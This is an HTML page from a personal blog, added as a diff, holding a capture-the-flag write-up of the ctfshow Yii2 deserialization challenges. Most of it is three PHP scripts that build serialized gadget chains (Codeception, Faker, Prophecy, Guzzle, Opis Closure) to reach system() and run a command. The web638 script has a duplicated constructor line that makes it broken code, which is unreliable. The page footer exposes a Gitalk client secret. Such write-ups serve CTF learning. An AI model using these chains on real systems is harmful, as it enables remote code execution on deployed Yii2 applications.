@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]Yii专题 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1783248062137">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web636
+Yii2反序列化链
+RunProcess-&gt;ValidGenerator
+这里因为有报错信息，看不到命令执行结果，写到其他文件来查看。
+&lt;?php
+namespace Faker{
+    class Defaul..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1783248062137" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]Yii专题</h2>
+            <div class="post-date">2024-08-20</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowyii-zhuan-ti.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web636">web636</h2>
+<p>Yii2反序列化链</p>
+<p><code>RunProcess</code>-&gt;<code>ValidGenerator</code></p>
+<p>这里因为有报错信息，看不到命令执行结果，写到其他文件来查看。</p>
+<pre><code class="language-php">&lt;?php
+namespace Faker{
+    class DefaultGenerator{
+        protected $default;
+        public function __construct($cmd)
+        {
+            $this-&gt;default = $cmd;
+        }
+    }
+    class ValidGenerator
+    {
+        protected $generator;
+        protected $validator;
+        protected $maxRetries;
+        public function __construct($cmd){
+            $this-&gt;generator=new DefaultGenerator($cmd);
+            $this-&gt;maxRetries=1;
+            $this-&gt;validator='system';
+        }
+    }
+}
+
+namespace Codeception\Extension{
+    use Faker\ValidGenerator;
+    class RunProcess{
+        private $processes = [] ;
+        function __construct($cmd)
+        {
+            $this-&gt;processes[] = new ValidGenerator($cmd);
+        }
+    }
+    echo(urlencode(serialize(new RunProcess('cat /flags_c &gt; 1.txt'))));
+}
+</code></pre>
+<h2 id="web637">web637</h2>
+<p>上题链被过滤<br>
+参考<a href="https://forum.butian.net/share/666">文章</a><br>
+<code>RunProcess</code>-&gt;<code>ObjectProphecy</code>-&gt;<code>LazyDouble</code>-&gt;<code>Doubler</code>-&gt;<code>ClassCreator</code></p>
+<p>分析就略了。。。(因为最新版的RunProcess被过滤了👻)</p>
+<pre><code class="language-php">&lt;?php
+/***
+ * Created by joker
+ * Date 2021/9/7 20:02
+ ***/
+namespace Codeception\Extension;
+use Prophecy\Prophecy\ObjectProphecy;
+class RunProcess{
+    private $processes;
+    function __construct()
+    {
+        $a = new ObjectProphecy('1');
+        $this-&gt;processes[] = new ObjectProphecy($a);
+    }
+}
+echo urlencode(serialize(new RunProcess()));
+namespace Prophecy\Prophecy;
+use Prophecy\Doubler\LazyDouble;
+class ObjectProphecy{
+    private $lazyDouble;
+    private $revealer;
+    function __construct($a)
+    {
+        $this-&gt;revealer = $a;
+        $this-&gt;lazyDouble = new LazyDouble();
+    }
+}
+
+namespace Prophecy\Doubler;
+class LazyDouble{
+    private $doubler;
+    private $argument;
+    private $class;
+    private $interfaces;
+    function __construct()
+    {
+        $this-&gt;doubler =new Doubler();
+        $this-&gt;class = new \ReflectionClass('Exception');
+        $this-&gt;argument = array('fallingskies'=&gt;'fallingskies');
+        $this-&gt;interfaces[] = new \ReflectionClass('Exception');
+    }
+}
+namespace Prophecy\Doubler\Generator\Node;
+class ClassNode{
+}
+
+namespace Prophecy\Doubler;
+use Prophecy\Doubler\Generator\Node\ClassNode;
+use Faker\DefaultGenerator;
+use Prophecy\Doubler\Generator\ClassCreator;
+class Doubler{
+    private $mirror;
+    private $creator;
+    private $namer;
+    function __construct()
+    {
+        $this-&gt;namer = new DefaultGenerator('fallingskies');
+        $this-&gt;mirror = new DefaultGenerator(new ClassNode());
+        $this-&gt;creator = new ClassCreator();
+    }
+}
+
+namespace Faker;
+class DefaultGenerator{
+    protected $default;
+    function __construct($default)
+    {
+        $this-&gt;default = $default;
+    }
+}
+
+namespace Prophecy\Doubler\Generator;
+use Faker\DefaultGenerator;
+class ClassCreator{
+    private $generator;
+    function __construct()
+    {
+        $this-&gt;generator = new DefaultGenerator('system(&quot;cat /flags_c &gt; 1.txt&quot;);');
+    }
+}
+</code></pre>
+<h2 id="web638">web638</h2>
+<p>参考文章：https://blog.csdn.net/Mrs_H/article/details/119928348<br>
+https://www.anquanke.com/post/id/251366#h2-6<br>
+https://xz.aliyun.com/t/9948</p>
+<p>需要下一个<a href="https://github.com/opis/closure">闭包依赖Opis Closure</a><br>
+这条链算最复杂的一条了🤣</p>
+<p>这里主要是用闭包函数，来解决<code>call_user_func()</code>只能控制第一个参数的情况。</p>
+<pre><code class="language-php">&lt;?php
+namespace Codeception\Extension{
+    use Faker\DefaultGenerator;
+    use GuzzleHttp\Psr7\AppendStream;
+    class  RunProcess{
+        protected $output;
+        private $processes = [];
+        public function __construct(){
+            $this-&gt;processes[]=new DefaultGenerator(new AppendStream());
+            $this-&gt;output=new DefaultGenerator('fallingskies');
+        }
+    }
+    echo urlencode(serialize(new RunProcess()));
+}
+
+namespace Faker{
+    class DefaultGenerator
+    {
+        protected $default;
+
+        public function __construct($default = null)
+        {
+            $this-&gt;default = $default;
+        }
+    }
+}
+namespace GuzzleHttp\Psr7{
+    use Faker\DefaultGenerator;
+    final class AppendStream{
+        private $streams = [];
+        private $seekable = true;
+        public function __construct(){
+            $this-&gt;streams[]=new CachingStream();
+        }
+    }
+    final class CachingStream{
+        private $remoteStream;
+        public function __construct(){
+            $this-&gt;remoteStream=new DefaultGenerator(false);
+            $this-&gt;stream=new  PumpStream();
+        }
+    }
+    final class PumpStream{
+        private $source;
+        private $size=-10;
+        private $buffer;
+        public function __construct(){
+        public function __construct(){
+            $this-&gt;buffer=new DefaultGenerator('fallingskies');
+            include(&quot;closure/autoload.php&quot;);
+            $a = function(){system(&quot;cat /flags_c &gt; 1.txt&quot;);};
+            $a = \Opis\Closure\serialize($a);
+            $b = unserialize($a);
+            $this-&gt;source=$b;
+        }
+    }
+}
+</code></pre>
+<h2 id="web639">web639</h2>
+<p>同上</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/yii2-fan-xu-lie-hua-lian-fen-xi/">
+                  <h3 class="post-title">
+                    [Yii2]反序列化链分析
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
